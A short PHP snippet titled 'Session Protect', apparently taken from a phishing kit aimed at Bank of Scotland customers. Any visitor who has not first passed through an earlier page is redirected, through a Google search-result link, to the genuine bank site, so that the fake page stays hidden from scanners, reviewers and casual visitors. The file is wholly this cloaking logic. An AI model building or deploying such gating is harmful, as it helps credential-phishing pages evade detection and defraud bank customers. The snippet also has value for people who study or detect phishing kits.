<?php

# Session Protect Snippet

session_start();
if(!isset($_SESSION['page_a_visited'])){
header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB8QFjAAahUKEwie_u7JwvnHAhXKlR4KHW3jA-w&url=https%3A%2F%2Fwww.bankofscotland.co.uk%2F&usg=AFQjCNHbYH9PiAHwueBiIBTc2NA56S8S4g");
die();
}
?>